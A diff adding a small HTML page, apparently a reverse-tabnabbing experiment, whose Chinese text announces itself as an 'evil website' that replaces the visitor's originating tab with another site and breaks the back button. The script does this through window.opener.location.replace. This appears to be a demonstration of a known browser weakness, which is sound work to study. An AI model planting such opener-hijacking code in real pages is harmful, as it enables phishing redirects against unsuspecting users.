@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>blank实验</title>
+</head>
+
+<body>
+    <h1>邪恶网站</h1>
+    <p>我会将你来时的页面换成
+            https://cemcoe.com/
+        并且返回按钮失效
+    </p>
+    <script>
+        const url = encodeURIComponent('{{header.referer}}');
+        window.opener.location.replace('https://cemcoe.com/');
+
+    </script>
+
+</body>
+
+</html>
